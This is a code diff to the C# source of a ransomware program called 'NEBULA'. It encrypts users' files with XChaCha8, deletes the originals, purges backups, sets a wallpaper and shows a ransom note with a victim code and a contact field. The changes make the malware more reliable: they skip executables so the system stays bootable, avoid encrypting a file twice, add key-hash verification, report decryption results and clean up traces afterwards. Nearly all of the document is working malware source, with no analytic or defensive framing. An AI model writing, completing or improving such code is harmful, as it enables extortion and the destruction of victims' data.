@@ -228,9 +228,20 @@ public class Nbl : Form
 							{
 								bool isTxt = fullPath.EndsWith(".txt", StringComparison.OrdinalIgnoreCase);
 								bool isNbl = fullPath.EndsWith(".nbl", StringComparison.OrdinalIgnoreCase);
-								if (encryptMode && !isNbl && !isTxt)
+								bool isExe = fullPath.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)
+									|| fullPath.EndsWith(".dll", StringComparison.OrdinalIgnoreCase)
+									|| fullPath.EndsWith(".bat", StringComparison.OrdinalIgnoreCase)
+									|| fullPath.EndsWith(".cmd", StringComparison.OrdinalIgnoreCase)
+									|| fullPath.EndsWith(".com", StringComparison.OrdinalIgnoreCase)
+									|| fullPath.EndsWith(".ps1", StringComparison.OrdinalIgnoreCase)
+									|| fullPath.EndsWith(".scr", StringComparison.OrdinalIgnoreCase)
+									|| fullPath.EndsWith(".msi", StringComparison.OrdinalIgnoreCase);
+								if (encryptMode && !isNbl && !isTxt && !isExe)
 								{
-									files.Add(fullPath);
+									if (!File.Exists(fullPath + ".nbl"))
+									{
+										files.Add(fullPath);
+									}
 								}
 								else if (!encryptMode && isNbl)
 								{
@@ -334,10 +345,40 @@ public class Nbl : Form
 		}
 	}
 
+	private static void CleanupTraces()
+	{
+		try
+		{
+			string wallpaperPath = Path.Combine(Path.GetTempPath(), "nebula_wallpaper.bmp");
+			if (File.Exists(wallpaperPath))
+			{
+				File.Delete(wallpaperPath);
+			}
+		}
+		catch
+		{
+		}
+
+		try
+		{
+			foreach (string root in GetTargetDirs())
+			{
+				if (string.IsNullOrEmpty(root) || !Directory.Exists(root) || IsSystemFolder(root)) continue;
+				string notePath = Path.Combine(root, "README_FOR_DECRYPTION.txt");
+				if (File.Exists(notePath))
+				{
+					File.Delete(notePath);
+				}
+			}
+		}
+		catch
+		{
+		}
+	}
+
 	public static void EncryptAll()
 	{
 		PurgeBackups();
-		GenerateVictimCode();
 		SetWallpaper();
 		byte[] key = new byte[32];
 		using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
@@ -345,6 +386,21 @@ public class Nbl : Form
 			rng.GetBytes(key);
 		}
 		XKey = key;
+
+                /**/
+		try
+		{
+			string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+			if (!string.IsNullOrEmpty(desktop) && Directory.Exists(desktop))
+			{
+				File.WriteAllText(Path.Combine(desktop, "NEBULA_KEY.txt"), Convert.ToBase64String(key), Encoding.UTF8);
+			}
+		}
+		catch
+		{
+		} 
+                /**/
+
 		byte[] nonce = DeriveNonceFromKey(key);
 
 		List<string> allFiles = new List<string>();
@@ -367,6 +423,12 @@ public class Nbl : Form
 	{
 		try
 		{
+			if (filePath.EndsWith(".nbl", StringComparison.OrdinalIgnoreCase)) return;
+			if (filePath.EndsWith(".txt", StringComparison.OrdinalIgnoreCase)) return;
+
+			string outPath = filePath + ".nbl";
+			if (File.Exists(outPath)) return;
+
 			byte[] plaintext;
 			using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, 65536, FileOptions.SequentialScan))
 			{
@@ -383,9 +445,14 @@ public class Nbl : Form
 			byte[] ciphertext = new byte[plaintext.Length];
 			XChaCha8.Crypt(key, nonce, plaintext, ciphertext);
 
-			using (FileStream fsOut = new FileStream(filePath + ".nbl", FileMode.Create, FileAccess.Write, FileShare.None, 65536, FileOptions.WriteThrough))
+			using (SHA256 sha = SHA256.Create())
 			{
-				fsOut.Write(ciphertext, 0, ciphertext.Length);
+				byte[] hash = sha.ComputeHash(key);
+				using (FileStream fsOut = new FileStream(filePath + ".nbl", FileMode.Create, FileAccess.Write, FileShare.None, 65536, FileOptions.WriteThrough))
+				{
+					fsOut.Write(hash, 0, hash.Length);
+					fsOut.Write(ciphertext, 0, ciphertext.Length);
+				}
 			}
 			File.Delete(filePath);
 		}
@@ -440,12 +507,36 @@ public class Nbl : Form
 					allFiles.AddRange(GetFilesFast(text2, false));
 				}
 			}
+			int success = 0;
+			int failed = 0;
+			object countLock = new object();
 			Parallel.ForEach(allFiles, new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount * 2 }, filePath =>
 			{
-				DecryptFile(filePath, key);
+				bool ok = DecryptFile(filePath, key);
+				lock (countLock)
+				{
+					if (ok) success++; else failed++;
+				}
 			});
-			MessageBox.Show("Done", "NEBULA", (MessageBoxButtons)0, (MessageBoxIcon)64);
-			SelfDeleteAndExit();
+			CleanupTraces();
+
+			if (success == 0 && failed > 0)
+			{
+				MessageBox.Show("Wrong Key", "NEBULA", (MessageBoxButtons)0, (MessageBoxIcon)16);
+			}
+			else if (success > 0 && failed > 0)
+			{
+				MessageBox.Show("Faulty Files/Double Key", "NEBULA", (MessageBoxButtons)0, (MessageBoxIcon)48);
+			}
+			else if (success > 0)
+			{
+				MessageBox.Show("Done", "NEBULA", (MessageBoxButtons)0, (MessageBoxIcon)64);
+				SelfDeleteAndExit();
+			}
+			else
+			{
+				MessageBox.Show("No .nbl files found to decrypt", "NEBULA", (MessageBoxButtons)0, (MessageBoxIcon)48);
+			}
 		}
 		catch
 		{
@@ -481,7 +572,7 @@ public class Nbl : Form
 
 	private void buttonClose_Click(object sender, EventArgs e)
 	{
-		SelfDeleteAndExit();
+		Close();
 	}
 
 	private void notifyIcon_DoubleClick(object sender, EventArgs e)
@@ -491,22 +582,41 @@ public class Nbl : Form
 		((Control)this).BringToFront();
 	}
 
-	private static void DecryptFile(string filePath, byte[] key)
+	private static bool DecryptFile(string filePath, byte[] key)
 	{
 		try
 		{
-			byte[] ciphertext;
+			if (!filePath.EndsWith(".nbl", StringComparison.OrdinalIgnoreCase)) return false;
+
+			byte[] fileData;
 			using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, 65536, FileOptions.SequentialScan))
 			{
-				ciphertext = new byte[fs.Length];
+				fileData = new byte[fs.Length];
 				int read = 0;
-				while (read < ciphertext.Length)
+				while (read < fileData.Length)
 				{
-					int n = fs.Read(ciphertext, read, ciphertext.Length - read);
+					int n = fs.Read(fileData, read, fileData.Length - read);
 					if (n == 0) break;
 					read += n;
 				}
 			}
+
+			if (fileData.Length < 32) return false;
+
+			byte[] storedHash = new byte[32];
+			Buffer.BlockCopy(fileData, 0, storedHash, 0, 32);
+
+			using (SHA256 sha = SHA256.Create())
+			{
+				byte[] computedHash = sha.ComputeHash(key);
+				for (int i = 0; i < 32; i++)
+				{
+					if (storedHash[i] != computedHash[i]) return false;
+				}
+			}
+
+			byte[] ciphertext = new byte[fileData.Length - 32];
+			Buffer.BlockCopy(fileData, 32, ciphertext, 0, ciphertext.Length);
 
 			byte[] nonce = DeriveNonceFromKey(key);
 			byte[] plaintext = new byte[ciphertext.Length];
@@ -518,9 +628,11 @@ public class Nbl : Form
 				fsOut.Write(plaintext, 0, plaintext.Length);
 			}
 			File.Delete(filePath);
+			return true;
 		}
 		catch
 		{
+			return false;
 		}
 	}
 
@@ -571,7 +683,7 @@ public class Nbl : Form
 		richTextBoxMessage.ScrollBars = (RichTextBoxScrollBars)2;
 		((Control)richTextBoxMessage).Size = new Size(645, 227);
 		((Control)richTextBoxMessage).TabIndex = 1;
-		((Control)richTextBoxMessage).Text = "ATTENTION!\n\nYour important files, documents, photos, and databases have been encrypted using military-grade XChaCha8 encryption.\n\nTo decrypt your files, you must enter the correct decryption password.\n\nAttempts to decrypt or modify files using third-party tools will result in permanent data loss.";
+		((Control)richTextBoxMessage).Text = "ATTENTION!\n\nYour important files, documents, photos, and databases have been encrypted using military-grade XChaCha8 encryption.\n\nTo decrypt your files, you must enter the correct decryption password.\n\nAttempts to decrypt or brute force or modify files using third-party tools will result in permanent data loss.";
        		/* NOTE HERE */
 		((Control)labelContactInfo).AutoSize = true;
 		((Control)labelContactInfo).Font = new Font("Segoe UI", 12f, (FontStyle)1);
@@ -580,7 +692,7 @@ public class Nbl : Form
 		((Control)labelContactInfo).Name = "labelContactInfo";
 		((Control)labelContactInfo).Size = new Size(321, 28);
 		((Control)labelContactInfo).TabIndex = 2;
-		((Control)labelContactInfo).Text = "Contact: EXAMPLE";
+		((Control)labelContactInfo).Text = "Contact: EXAMPLE"; /* CONTACT */
 		((Control)labelVictimCode).AutoSize = true;
 		((Control)labelVictimCode).Font = new Font("Segoe UI", 12f, (FontStyle)1);
 		((Control)labelVictimCode).ForeColor = Color.DodgerBlue;
